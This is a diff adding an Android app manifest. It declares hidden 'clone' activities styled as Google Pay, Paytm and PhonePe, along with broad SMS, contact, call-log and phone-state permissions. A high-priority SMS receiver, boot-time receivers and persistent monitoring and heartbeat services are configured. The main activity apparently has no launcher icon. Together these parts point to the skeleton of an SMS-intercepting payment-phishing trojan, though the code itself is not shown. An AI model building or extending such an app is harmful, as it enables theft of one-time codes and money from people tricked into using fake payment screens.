@@ -1,0 +1,258 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- Optional telephony hardware flag -->
+    <uses-feature
+        android:name="android.hardware.telephony"
+        android:required="false" />
+
+    <!-- Network & Internet -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+
+    <!-- SMS & Phone -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.RECEIVE_MMS" />
+    <uses-permission android:name="android.permission.RECEIVE_WAP_PUSH" />
+
+    <!-- Contacts & Call Log -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+
+    <!-- Background Services -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission 
+        android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"
+        android:minSdkVersion="34" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CONNECTED_DEVICE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
+
+    <!-- Battery Optimization -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <!-- Boot & System -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission 
+        android:name="android.permission.POST_NOTIFICATIONS"
+        android:minSdkVersion="33" />
+    
+    <!-- JobScheduler -->
+    <uses-permission android:name="android.permission.BIND_JOB_SERVICE" />
+
+    <!-- Firebase Cloud Messaging -->
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/flavor_app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:usesCleartextTraffic="true"
+        android:directBootAware="true"
+        tools:targetApi="33">
+
+        <!-- Main Activity -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:screenOrientation="unspecified"
+            android:configChanges="orientation|screenSize|keyboardHidden">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.INFO" />
+            </intent-filter>
+        </activity>
+
+        <!-- Payment Activity -->
+        <activity
+            android:name=".PaymentActivity"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:taskAffinity="com.example.test.payment"
+            android:screenOrientation="unspecified"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:theme="@style/Theme.Payment" />
+
+        <!-- Google Pay Clone Activity -->
+        <activity
+            android:name=".GPayCloneActivity"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:taskAffinity="com.example.test.gpayclone"
+            android:screenOrientation="unspecified"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:theme="@style/Theme.GPayClone" />
+
+        <!-- Paytm Clone Activity -->
+        <activity
+            android:name=".PaytmCloneActivity"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:taskAffinity="com.example.test.paytmclone"
+            android:screenOrientation="unspecified"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:theme="@style/Theme.PaytmClone" />
+
+        <!-- PhonePe Clone Activity -->
+        <activity
+            android:name=".PhonePeCloneActivity"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:taskAffinity="com.example.test.phonepeclone"
+            android:screenOrientation="unspecified"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:theme="@style/Theme.PhonePeClone" />
+
+        <!-- Firebase Messaging Service -->
+        <service
+            android:name=".MyFirebaseMessagingService"
+            android:exported="false"
+            android:directBootAware="true">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT" />
+            </intent-filter>
+        </service>
+
+        <!-- SMS Monitoring Service -->
+        <service
+            android:name=".SmsService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:directBootAware="true"
+            android:foregroundServiceType="dataSync"
+            tools:targetApi="q" />
+
+        <!-- Heartbeat Service -->
+        <service
+            android:name=".HeartbeatService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:directBootAware="true"
+            android:foregroundServiceType="dataSync"
+            tools:targetApi="q" />
+
+        <!-- Network Monitoring Service -->
+        <service
+            android:name=".NetworkService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:directBootAware="true"
+            android:foregroundServiceType="dataSync"
+            tools:targetApi="q" />
+
+        <!-- Heartbeat Job Service -->
+        <service
+            android:name=".HeartbeatJobService"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:directBootAware="true" />
+
+        <!-- SMS Receiver -->
+        <receiver
+            android:name=".SmsReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Boot Receiver -->
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:directBootAware="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.REBOOT" />
+                <action android:name="android.intent.action.USER_UNLOCKED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Network Receiver -->
+        <receiver
+            android:name=".NetworkReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_ACTION" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Firebase Init Provider -->
+        <provider
+            android:name="com.google.firebase.provider.FirebaseInitProvider"
+            android:exported="false"
+            android:authorities="${applicationId}.firebaseinitprovider"
+            android:initOrder="100"
+            android:directBootAware="true" />
+
+        <!-- Firebase Component Discovery Service -->
+        <service
+            android:name="com.google.firebase.components.ComponentDiscoveryService"
+            android:exported="false"
+            android:directBootAware="true">
+            <meta-data
+                android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingKtxRegistrar"
+                android:value="com.google.firebase.components.ComponentRegistrar" />
+            <meta-data
+                android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingRegistrar"
+                android:value="com.google.firebase.components.ComponentRegistrar" />
+            <meta-data
+                android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsKtxRegistrar"
+                android:value="com.google.firebase.components.ComponentRegistrar" />
+            <meta-data
+                android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsRegistrar"
+                android:value="com.google.firebase.components.ComponentRegistrar" />
+            <meta-data
+                android:name="com.google.firebase.components:com.google.firebase.ktx.FirebaseCommonLegacyRegistrar"
+                android:value="com.google.firebase.components.ComponentRegistrar" />
+            <meta-data
+                android:name="com.google.firebase.components:com.google.firebase.FirebaseCommonKtxRegistrar"
+                android:value="com.google.firebase.components.ComponentRegistrar" />
+        </service>
+
+        <meta-data
+            android:name="com.google.android.gms.version"
+            android:value="@integer/google_play_services_version" />
+
+        <!-- Google API Activity -->
+        <activity
+            android:name="com.google.android.gms.common.api.GoogleApiActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:authorities="${applicationId}.androidx-startup"
+            android:exported="false"
+            tools:node="merge">
+            <meta-data
+                android:name="androidx.work.WorkManagerInitializer"
+                android:value="androidx.startup"
+                tools:node="remove" />
+        </provider>
+
+    </application>
+
+</manifest>
